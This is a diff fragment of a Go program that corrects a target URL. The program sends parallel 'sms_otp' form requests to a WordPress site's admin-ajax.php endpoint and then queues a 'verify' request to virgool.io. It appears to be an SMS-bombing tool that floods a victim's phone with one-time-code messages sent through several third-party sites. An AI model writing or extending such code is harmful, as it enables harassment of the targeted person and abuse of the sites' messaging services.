@@ -335,7 +335,7 @@ func main() {
 				formData.Set("_wp_http_referer", "/?login=true") // مقدار ثابت
 				formData.Set("container", "digits_protected") // مقدار ثابت
 				formData.Set("sub_action", "sms_otp")         // مقدار ثابت
-				sendFormRequest(ctx, "https://game.fa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
                        // virgool.io (verify - POST JSON)
 			wg.Add(1)
